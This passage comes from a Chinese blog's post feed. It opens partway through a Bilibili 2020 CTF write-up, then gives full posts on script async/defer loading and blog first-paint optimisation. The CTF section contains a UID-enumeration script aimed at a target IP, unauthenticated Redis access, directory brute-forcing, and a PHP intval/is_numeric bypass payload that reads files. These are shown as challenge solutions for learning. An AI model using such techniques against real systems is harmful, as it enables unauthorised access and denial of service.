字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/10.png\" width=\"1443\" height=\"870\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/11.png\" width=\"406\" height=\"168\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/12.png\" width=\"833\" height=\"573\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/13.png\" width=\"689\" height=\"145\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\">\n<div>Bilibili 2020「1024 程序员节」CTF Write Up</div>\n<div><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-10-25</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no \"document.write\" in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<p><img src=\"https://pic.skk.moe/file/moegirl/ckz6vn6qm00003f5yh5f0tvq8.svg\"></p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\">\n<div>从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div>\n<div><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-10-13</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/1.png\" width=\"1276\" 